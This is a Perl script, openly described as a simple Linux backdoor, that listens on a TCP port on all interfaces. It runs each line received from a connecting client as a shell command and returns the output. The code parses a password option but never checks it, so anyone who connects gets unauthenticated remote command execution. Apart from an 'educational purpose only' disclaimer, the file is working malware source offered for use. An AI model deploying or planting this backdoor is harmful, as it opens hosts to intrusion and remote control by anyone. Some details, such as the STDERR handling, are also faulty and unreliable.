#!/bin/perl
# perl version : 5.30
# Description : This is a simple backdoor linux
package SrvBack;

use Getopt::Long;
use IO::Socket::INET;

Getopt::Long::Configure('bundling');

my $helpText = "
Description : This is a simple backdoor

Usage : \n
--password | -u\t: password to use
--port     |   \t: port to use (default port of protocol)
--help     | -h\t: print this help
--verbose  | -v\t: print more verbose

(This tool is for educational purpose only)

\n\nExample :

perl SrvBack.pl --port 34232
";

my $versionText = "
Author \t: \@Exo-poulpe
Version \t: 0.1.0.0

This tool is for educational purpose only, usage of PerlForing for attacking targets without prior mutual consent is illegal.
Developers assume no liability and are not responsible for any misuse or damage cause by this program.

";

my $help;
my $version;
my $verbose;
my $port;
my $password;
my $soc;

GetOptions(
    'password|p=s' => \$password,    # string
    'port=i'       => \$port,        # string
    'version'      => \$version,     # flag
    'verbose|v'    => \$verbose,     # flag
    'help|h|?'     => \$help,        # flag
) or die($helpText);

sub main()
{
    $| = 1;
    if ( defined $help )
    {
        print($helpText);
    }
    elsif ( defined $port )
    {
        my $tmpSoc;

        $soc = new IO::Socket::INET(
            LocalHost => '0.0.0.0',
            LocalPort => $port,
            Proto     => 'tcp',
            Listen    => 1,
            Reuse     => 1
        ) or die "ERROR in Socket Creation : $!\n";

        if ( defined $verbose )
        {
            print "SERVER Waiting client connection on port $port\n";
        }

        $tmpSoc = $soc->accept();
        if ( defined $verbose )
        {
            print("Connected\n");
        }
        my $res;
        my $err;
        while (1)
        {
            open($err,<STDERR>);
            while ( my $rec = <$tmpSoc> )
            {
                chomp($rec);
                if(defined $verbose)
                {
                    print("Rec : '$rec'\n");
                }
                $res = `$rec`;
                if($res eq "")
                {
                    $res = "$err\n";
                }
                if(defined $verbose)
                {
                    print("Data : $res\n");
                }
                $tmpSoc->send($res . "{}\n");
            }

        }
        $soc->close();
    }else
    {
        print($helpText);
    }
}

main();
